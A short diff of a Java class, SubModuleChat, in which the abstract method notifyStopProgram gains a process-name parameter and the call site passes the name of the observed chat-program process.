@@ -38,7 +38,7 @@ public abstract class SubModuleChat extends SubModule {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
 				}
-				notifyStopProgram();
+				notifyStopProgram(process.processInfo.processName);
 				return 1;
 			}
 		}
@@ -49,7 +49,7 @@ public abstract class SubModuleChat extends SubModule {
 		return (ModuleChat) module;
 	}
 
-	abstract void notifyStopProgram();
+	abstract void notifyStopProgram(String processName);
 
 	abstract int getProgramId();
 	abstract String getObservingProgram();
